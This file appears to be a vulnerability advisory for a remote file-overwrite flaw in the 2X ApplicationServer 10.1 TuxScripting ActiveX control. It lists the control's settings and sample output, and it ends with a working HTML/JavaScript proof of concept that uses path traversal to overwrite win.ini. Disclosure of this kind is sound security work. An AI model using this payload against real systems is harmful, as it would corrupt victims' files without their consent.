@@ -1,0 +1,106 @@
+2X ApplicationServer 10.1 TuxSystem Class ActiveX Control TuxScripting.dll 
+ExportSettings Remote File Overwrite Vulnerability
+
+tested against: Microsoft Windows Server 2003 r2 sp2
+                Internet Explorer 8
+
+vendor description:
+"2X Software is a global leader of desktop and application delivery, 
+remote access and cloud computing solutions."
+
+2x homepage: http://www.2x.com/
+
+download url: http://www.2x.com/applicationserver/download/
+
+file tested: 2XAppServer.msi
+
+
+Background:
+
+The mentioned product installs an ActiveX control with
+the following settings:
+
+ProgID: TuxScripting.TuxSystem.1
+CLSID: {5BD64392-DA66-4852-9715-CFBA98D25296}
+Binary Path C:\Program Files\2X\ApplicationServer\TuxScripting.dll
+Implements IObjectSafety: Yes
+Safe for Scripting: True
+Safe for Initialization: ?
+
+According to the IObjectSafety interface this control is Safe for Scripting
+then Internet Explorer will allow access to the availiable methods and
+properties.
+
+
+Vulnerability:
+
+Two methods perform unsecure file operations (read/write):
+
+...
+/* DISPID=13 */
+	function ImportSettings(
+		/* VT_BSTR [8]  */ $FileName 
+		)
+	{
+		/* method ImportSettings */
+	}
+	/* DISPID=14 */
+	function ExportSettings(
+		/* VT_BSTR [8]  */ $FileName 
+		)
+	{
+		/* method ExportSettings */
+	}
+...
+
+by passing an existing file path to the ExportSettings() the
+resulting file content will look like this:
+
+<Setup xmlns:dt="urn:schemas-microsoft-com:datatypes"><Connection><CGW_FGWs dt:d
+t="string">&lt;Default&gt;</CGW_FGWs><CGW_HTTPs dt:dt="string">&lt;Default&gt;</
+CGW_HTTPs><CGW_IPs dt:dt="string">192.168.2.101:0</CGW_IPs><CGW_PUBs dt:dt="stri
+ng">&lt;Default&gt;</CGW_PUBs><Domain dt:dt="string">WORKGROUP/SERVER</Domain><I
+D dt:dt="ui4">2</ID><LocalInst dt:dt="ui4">1</LocalInst><RanID dt:dt="ui4">12638
+38571</RanID><SecLevAuth><ExcGWIPsLst dt:dt="string">&lt;Default&gt;</ExcGWIPsLs
+t></SecLevAuth><Server dt:dt="string">SERVER</Server></Connection><LoadBalancer>
+<PersTime dt:dt="ui4">1279870543</PersTime><ServerIndex dt:dt="ui4">2</ServerInd
+ex><VDIHosts><VDIHostsIndex dt:dt="ui4">2</VDIHostsIndex></VDIHosts><VDIHostsGro
+up><VDIHostGroupIndex dt:dt="ui4">0</VDIHostGroupIndex></VDIHostsGroup></LoadBal
+ancer><Product><Build dt:dt="ui4">1204</Build><Major dt:dt="ui4">10</Major><Mino
+r dt:dt="ui4">1</Minor><Name dt:dt="string">VDS</Name></Product><Publishing><Out
+putDir dt:dt="string">C:\Program Files\Internet Explorer\web\output</OutputDir><
+WebPageTemplate dt:dt="string">C:\Program Files\Internet Explorer\web\2X_default
+_style.xslt</WebPageTemplate></Publishing><Redundancy><BCtrls><BCtrl0001><ID dt:
+dt="ui4">1</ID><Priority dt:dt="ui4">0</Priority><Server dt:dt="string">SERVER</
+Server></BCtrl0001></BCtrls><IDCntr dt:dt="ui4">1</IDCntr><MasterServer dt:dt="s
+tring">SERVER</MasterServer><SettingsCount dt:dt="ui4">1</SettingsCount><Setting
+sID dt:dt="ui4">1326947769</SettingsID><SettingsTime dt:dt="ui4">1326947769</Set
+tingsTime></Redundancy><Reporting><Rprtng2X><RprtSrv dt:dt="string"></RprtSrv></
+Rprtng2X><RprtngEG><RprtSrv dt:dt="string"></RprtSrv></RprtngEG></Reporting></Se
+tup>
+
+If a remote attacker is able to take control of the file content, could also be 
+capable to run arbitrary code. At the time of this report, this could not be achieved yet
+(I have experienced some unuseful crashes by calling ImportSettings() ...)
+
+As attachment, proof of concept code which overwrites win.ini
+
+POC:
+<!--
+2X ApplicationServer 10.1 TuxSystem Class ActiveX Control TuxScripting.dll 
+Remote File Overwrite Vulnerability
+
+ActiveX settings:
+ProgID: TuxScripting.TuxSystem.1
+CLSID: {5BD64392-DA66-4852-9715-CFBA98D25296}
+Binary Path C:\Program Files\2X\ApplicationServer\TuxScripting.dll
+Implements IObjectSafety: Yes
+Safe for Scripting: True
+Safe for Initialization: ?
+-->
+<!-- saved from url=(0014)about:internet -->
+<html>
+<script>
+var obj = new ActiveXObject("TuxScripting.TuxSystem.1");
+obj.ExportSettings("../../../../../../../../windows/win.ini");
+</script>
